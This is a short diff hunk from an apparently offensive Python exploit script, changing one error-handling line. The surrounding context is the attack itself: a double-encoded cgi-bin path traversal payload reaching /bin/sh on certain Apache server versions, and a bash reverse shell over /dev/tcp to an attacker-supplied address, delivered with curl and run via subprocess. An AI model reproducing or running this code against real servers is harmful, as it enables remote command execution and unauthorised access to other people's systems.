@@ -13,7 +13,7 @@ def exploit(ip_dest, port_dest, ip_src, port_src):
         elif '50' in r.headers['Server']:
             payload = '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
         else:
-            print('Error')
+            return 'Error'
         rs = 'bash -c "/bin/sh -i >& /dev/tcp/{0}/{1} 0>&1"'.format(ip_src, port_src)
         cmd = "curl -s --path-as-is '{1}{2}' --data 'echo Content-Type: text/plain; echo; {0}'".format(rs, host, payload)
         shell = subprocess.popen(cmd) # TODO: background the command to not block the script execution
